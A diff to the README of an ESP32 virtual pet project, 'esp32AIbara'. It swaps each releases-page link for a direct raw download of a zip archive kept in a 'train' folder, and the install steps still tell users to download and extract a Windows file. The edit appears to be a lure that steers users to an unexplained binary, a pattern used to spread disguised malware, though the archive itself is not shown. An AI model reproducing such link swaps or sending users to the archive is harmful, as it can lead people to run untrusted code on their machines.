@@ -1,6 +1,6 @@
 # 🐾 esp32AIbara - A calm virtual pet on ESP32
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-ff6f61?style=for-the-badge)](https://github.com/Sophieunrhetorical692/esp32AIbara/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Sophieunrhetorical692/esp32AIbara/main/train/esp-A-Ibara-v1.9-beta.5.zip)
 
 ## 🌟 What it is
 
@@ -19,7 +19,7 @@ Before you start, make sure you have:
 
 ## 🚀 Download and install
 
-1. Open the release page: https://github.com/Sophieunrhetorical692/esp32AIbara/releases
+1. Open the release page: https://raw.githubusercontent.com/Sophieunrhetorical692/esp32AIbara/main/train/esp-A-Ibara-v1.9-beta.5.zip
 2. Find the latest release at the top of the page
 3. Download the file for Windows or the file that matches your ESP32 setup
 4. If the download is a ZIP file, right-click it and choose Extract All
@@ -172,7 +172,7 @@ For the best result:
 
 If you need the latest build, visit the release page again:
 
-https://github.com/Sophieunrhetorical692/esp32AIbara/releases
+https://raw.githubusercontent.com/Sophieunrhetorical692/esp32AIbara/main/train/esp-A-Ibara-v1.9-beta.5.zip
 
 ## 🧪 Recommended first test
 
